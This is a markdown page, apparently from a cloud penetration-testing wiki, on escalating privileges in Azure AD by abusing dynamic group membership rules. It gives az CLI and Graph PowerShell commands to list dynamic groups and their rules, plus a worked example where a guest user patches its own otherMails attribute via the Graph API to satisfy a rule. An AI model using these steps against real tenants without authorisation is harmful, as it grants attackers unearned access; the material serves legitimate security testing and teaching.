@@ -1,0 +1,82 @@
+# Az - Dynamic Groups Privesc
+
+## Basic Information
+
+**Dynamic groups** are groups that has a set of **rules** configured and all the **users or devices** that match the rules are added to the group. Every time a user or device **attribute** is **changed**, dynamic rules are **rechecked**. And when a **new rule** is **created** all devices and users are **checked**.
+
+Dynamic groups can have **Azure RBAC roles assigned** to them, but it's **not possible** to add **AzureAD roles** to dynamic groups.
+
+This feature requires Azure AD premium P1 license.
+
+## Privesc
+
+Note that by default any user can invite guests in Azure AD, so, If a dynamic group **rule** gives **permissions** to users based on **attributes** that can be **set** in a new **guest**, it's possible to **create a guest** with this attributes and **escalate privileges**. It's also possible for a guest to manage his own profile and change these attributes.
+
+Get groups that allow Dynamic membership: **`az ad group list --query "[?contains(groupTypes, 'DynamicMembership')]" --output table`**
+
+### Dynamic Groups Enumeration
+
+Get the rules of a dynamic group:
+
+With **Azure CLI**:
+
+```bash
+az ad group list \
+  --filter "groupTypes/any(c:c eq 'DynamicMembership')" \
+  --query "[].{displayName:displayName, rule:membershipRule}" \
+  -o table
+```
+
+With **PowerShell** and **Microsoft Graph SDK**:
+
+```bash
+Install-Module Microsoft.Graph -Scope CurrentUser -Force
+Import-Module Microsoft.Graph
+
+Connect-MgGraph -Scopes "Group.Read.All"
+
+Get-MgGroup -Filter "groupTypes/any(c:c eq 'DynamicMembership')" `
+            -Property Id, DisplayName, GroupTypes
+
+# Get the rules of a specific group
+$g = Get-MgGroup -Filter "displayName eq '<GROUP NAME>'" `
+                 -Property DisplayName, GroupTypes, MembershipRule, MembershipRuleProcessingState
+
+$g | Select-Object DisplayName, GroupTypes, MembershipRule
+
+# Get the rules of all dynamic groups
+Get-MgGroup -Filter "groupTypes/any(c:c eq 'DynamicMembership')" `
+            -Property DisplayName, MembershipRule |
+    Select-Object DisplayName, MembershipRule
+```
+
+### Example
+
+- **Rule example**: `(user.otherMails -any (_ -contains "security")) -and (user.userType -eq "guest")`
+- **Rule description**: Any Guest user with a secondary email with the string 'security' will be added to the group
+
+For the Guest user email, accept the invitation and check the current settings of **that user** in [https://entra.microsoft.com/#view/Microsoft_AAD_IAM/TenantOverview.ReactView](https://entra.microsoft.com/#view/Microsoft_AAD_IAM/TenantOverview.ReactView).\
+Unfortunately the page doesn't allow to modify the attribute values so we need to use the API:
+
+```bash
+# Login with the gust user
+az login --allow-no-subscriptions
+
+# Get user object ID
+az ad signed-in-user show
+
+# Update otherMails
+az rest --method PATCH \
+  --url "https://graph.microsoft.com/v1.0/users/<user-object-id>" \
+  --headers 'Content-Type=application/json' \
+  --body '{"otherMails": ["newemail@example.com", "anotheremail@example.com"]}'
+
+# Verify the update
+az rest --method GET \
+  --url "https://graph.microsoft.com/v1.0/users/<user-object-id>" \
+  --query "otherMails"
+```
+
+## References
+
+- [https://www.mnemonic.io/resources/blog/abusing-dynamic-groups-in-azure-ad-for-privilege-escalation/](https://www.mnemonic.io/resources/blog/abusing-dynamic-groups-in-azure-ad-for-privilege-escalation/)
